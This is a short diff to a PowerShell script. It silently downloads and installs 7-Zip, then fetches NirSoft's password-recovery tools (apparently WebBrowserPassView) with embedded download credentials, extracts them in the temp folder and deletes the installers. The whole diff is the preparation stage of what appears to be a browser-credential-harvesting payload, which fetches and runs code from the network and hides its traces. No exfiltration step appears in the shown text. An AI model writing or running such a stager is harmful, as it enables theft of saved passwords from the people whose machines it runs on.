@@ -3,8 +3,9 @@ $ProgressPreference = "SilentlyContinue";
 New-Item -Path $env:temp -ItemType Directory -Force;
 Set-Location $env:temp;
 
-$7zurl = "https://7-zip.org/" + (Invoke-WebRequest -UseBasicParsing -Uri "https://www.7-zip.org/download.html" | Select-Object -ExpandProperty Links | Where-Object { $_.href -like "a/7zr.exe" } | Select-Object -First 1 | Select-Object -ExpandProperty href);
+$7zurl = "https://7-zip.org/" + (Invoke-WebRequest -UseBasicParsing -Uri "https://www.7-zip.org/" | Select-Object -ExpandProperty Links | Where-Object { $_.href -like "*-x64.exe" } | Select-Object -First 1 | Select-Object -ExpandProperty href);
 Invoke-WebRequest $7zurl -OutFile "7z.exe" | Wait-Process;
+Start-Process -FilePath ".\7z.exe" -ArgumentList "/S" -Wait;
 
 $headers = @{
     "Authorization" = "Basic ZG93bmxvYWQ6bmlyc29mdDEyMyE=";
@@ -12,7 +13,7 @@ $headers = @{
 };
 
 Invoke-WebRequest -Headers $headers -Uri https://www.nirsoft.net/protected_downloads/passreccommandline.zip -OutFile wbpv.zip | Wait-Process;
-.\7z.exe e "wbpv.zip" -p"nirsoft123!" -o"wbpv" -y -Wait;
+7z e "wbpv.zip" -p"nirsoft123!" -o"wbpv" -y -Wait;
 
 Remove-Item "wbpv.zip" -Force;
 Remove-Item "7z.exe" -Force;
